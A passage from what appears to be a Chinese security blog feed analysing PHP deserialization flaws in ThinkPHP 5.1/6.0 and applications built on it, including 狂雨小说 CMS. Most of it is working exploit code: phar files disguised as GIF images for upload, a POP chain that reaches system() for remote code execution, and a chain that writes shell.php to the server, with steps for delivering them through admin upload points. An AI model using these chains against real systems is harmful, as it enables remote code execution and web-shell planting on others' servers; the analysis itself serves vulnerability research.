punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>将生成的phar文件修改成gif文件，找一处上传gif图片的点，上传这个pahr文件，在添加商品处：admin/store.StoreProduct/create.html</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/5.png" alt="" loading="lazy"></p><p>利用phar协议执行反序列化</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/6.png" alt="" loading="lazy"></p><h4 id="狂雨小说cms-phar反序列化"><a href="#狂雨小说cms-phar反序列化" class="headerlink" title="狂雨小说cms phar反序列化"></a><strong>狂雨小说cms phar反序列化</strong></h4><p>狂雨小说cms最新版是基于tp5.1.33开发的，此漏洞在后台触发。在控制器\application\admin\controller\Ranking.php中的delAllFiles方法，dir参数可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/7.png" alt="" loading="lazy"></p><p>利用tp的pop链生成phar文件，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Request</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Windows</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>修改后缀为gif，找一处图片上传的点，将phar.gif上传</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/8.png" alt="" loading="lazy"></p><p>最后利用phar协议执行gif文件进行反序列攻击。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/9.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;phar的结构&quot;&gt;&lt;a href=&quot;#phar的结构&quot; class=&quot;headerlink&quot; title=&quot;phar的结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;phar的结构&lt;/strong&gt;&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;a stub是一个文件标志，格式为 ：&lt;code&gt;xx
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-13T09:07:31.000Z</published>
    <updated>2020-05-13T09:11:10.699Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>安装tp6.0</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6.0cd tp6.0php think run</code></pre><p>在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>全局搜索__destruct魔术方法，在\vendor\topthink\think-orm\src\Model.php</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;lazySave可控，为true的时候，执行save方法，跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/1.png" alt="" loading="lazy"></p><p>这里要满足两个if语句，$this-&gt;isEmpty()为false，$this-&gt;trigger要不为false，跟进isEmpty方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>$this-&gt;data可控，当存在的时候返回false，继续跟进trigger方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/2.png" alt="" loading="lazy"></p><p>$this-&gt;withEvent可控，当为false时，进入teturn语句，满足if语句，继续看下一行代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">updateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insertData</span><span class="token punctuation">(</span><span class="token variable">$sequence</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$this-&gt;exists可控，为true时，跟进updateData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/3.png" alt="" loading="lazy"></p><p>这里要执行到checkAllowFields方法，需要经过2个if语句，第一个if要满足$this-&gt;trigger不为false</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'BeforeUpdate'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第二个if要满足$data存在，跟进下getChangedData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/4.png" alt="" loading="lazy"></p><p>这里满足$this-&gt;force存在，$this-&gt;data也可控，即2个if语句也绕过了，就可以继续跟进checkAllowFields方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/5.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;table和$this-&gt;suffix进行连接操作，即为字符串，可以触发__toString方法，这里就可以利用ThinkPHP5.2.x那条pop链来构造rce，全局进行搜索__toString方法，跟到\vendor\topthink\think-orm\src\model\concern\Conversion.php文件</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson-&gt;toArray方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/6.png" alt="" loading="lazy"></p><p>这里需要执行到getAttr方法，需要满足其中一个$data的key和$this-&gt;visible的key相同，既可以触发getAttr方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getAttr</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// key = name</span><span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// whoami</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvalidArgumentException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$relation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isRelationAttr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span>    <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// fanxing  whoami</span><span class="token punctuation">}</span></code></pre><p>跟进getData方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/7.png" alt="" loading="lazy"></p><p>这里$fieldName的键要存在于$this-&gt;data数组中，而$fieldName时通过getRealFieldName获取的</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getRealFieldName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">strict</span> <span class="token operator">?</span> <span class="token variable">$name</span> <span class="token punctuation">:</span> Str<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">snake</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足$this-&gt;strict为true就返回传递进来的值。最后又回到getAttr方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>经过上面的分析，这里满足$name和$value可控，跟进getValue方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/8.png" alt="" loading="lazy"></p><p>漏洞触发点在圈起的地方，这里value可控，只需要满足$closure可控就可以rce，看上行代码，$this-&gt;withAttr是可控的，$fieldName是经过getRealFieldName方法获得的，也是可控的，最后，整个pop链就分析完了。</p><h4 id="pop链流程"><a href="#pop链流程" class="headerlink" title="pop链流程"></a><strong>pop链流程</strong></h4><p>这里利用下<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">Mochazz</a>的pop链分析图片</p><p><img src="https://raw.githubusercontent.com/Mochazz/ThinkPHP-Vuln/master/ThinkPHP6/ThinkPHP6.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt="" loading="lazy"></p><h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><strong>EXP编写</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span><span class="token keyword">trait</span> <span class="token class-name">Conversion</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">Attribute</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">visible</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'fanxing'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/6666/9.png" alt="" loading="lazy"></p><p>tp6.0反序列还有其他链，复制下<a href="http://hed9eh0g.top/?p=217" target="_blank" rel="noopener">Hed9eh0g</a>这条链写入文件的poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token 